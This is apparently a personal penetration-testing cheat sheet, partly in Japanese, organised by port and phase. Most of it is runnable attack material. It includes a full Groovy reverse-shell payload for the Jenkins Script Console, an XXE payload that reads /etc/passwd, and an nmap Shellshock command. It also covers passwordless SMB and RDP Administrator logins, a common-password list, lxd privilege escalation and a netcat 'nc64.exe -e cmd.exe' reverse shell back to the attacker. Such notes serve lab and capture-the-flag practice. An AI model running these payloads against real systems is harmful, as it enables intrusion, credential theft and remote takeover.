# TCP

## SSH - 22TCP



## HTTP - 80TCP

### Directory enumeration

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {target_IP}
```

### ShellShock

gobuster で `/cgi-bin/` を見つける。

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}/
/cgi-bin/             (Status: 403) [Size: 294]
```

`-x`オプションに `cgi`, `sh`, `pl`, `py` を入れて再度列挙。

```ba
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}/cgi-bin/ -x cgi, sh, pl, py
```

`user.sh`などのファイルを見つける。

nmap の `http-shellshock` スクリプトを使用する。

```ba
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls {target_IP}
```

### Jenkins

Script Consoleにアクセスする。

```
http://{target_IP}/script
```

Script Console に [Groovy payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) を貼り付けて reverse shell を取得。

```Groovy
String host="{your_IP}";
int port={listening port e.g. 8000};
String cmd="{/bin/bash or cmd.exe}";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()) {
	while(pi.available()>0)so.write(pi.read());
	while(pe.available()>0)so.write(pe.read());
	while(si.available()>0)po.write(si.read());
	so.flush();
	po.flush();
	Thread.sleep(50);
	try {
		p.exitValue();
		break;
	} catch(Exception e) {}
};
p.destroy();
s.close();	
```

### XXE - XEE - XML External Entity

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

XMLの入力フィールドにXXEインジェクションコードを入れて送信する。

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

BurpSuite の Repeater を使って出力を確認する。

```bash
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Most common passwords: latest 2021 statistics

https://cybernews.com/best-password-managers/most-common-passwords/

1. 123456
2. 123456789
3. qwerty
4. password
5. 12345
6. qwerty123
7. 1q2w3e
8. 12345678
9. 111111
10. 1234567890

## SMB - 445TCP

### Administrator login without password

```bash
smbclient -L {target_IP} -U Administrator
Enter WORKGROUP\Administrato's password:{Enter(without password)}
```



## RDP - 3389TCP

### Testing guest login

```bash
xfreerdp /v:{target_IP}
```

### Administrator login without password

```
xfreerdp /v:{traget_IP} /cert:ignore /u:Administrator
Password:{Enter(without password)}
```

# UDP

## TFTP - 69UDP

任意のファイルをアップロードできる。

```bash
tftp {target_IP}
tftp> put {filename}
tftp> quit
```

アップロードしたファイルのデフォルト保存場所は `/var/lib/tftpboot/{filename}`。

# Lateral Movement

## www-data user

`/var/www/html`を確認する。

```bash
ls -a
.htaccess	.htpasswd
cat .htpasswd
username:password
```

`.htpasswd` に `username` , `password` が平文で保存されており、それが shell で使いまわされている可能性がある。

# Privilege Escalation

## Linux

### lxd or lxc group

https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

ローカルマシンで distro builder をインストール・ビルドして、出来上がった `lxd.tar.xz`, `rootfs.squashfs` をターゲットマシンに転送する。

## Windows

### nc64.exe (Netcat)

https://eternallybored.org/misc/netcat/

https://github.com/int0x33/nc.exe/blob/master/nc64.exe

ローカルマシンで `netcat` を実行しておく。

```bash
nc -lvnp {port}
```

ターゲットマシンに `nc64.exe` を導入し、実行する。

```powershell
nc64.exe -e cmd.exe {your_IP} {port}
```

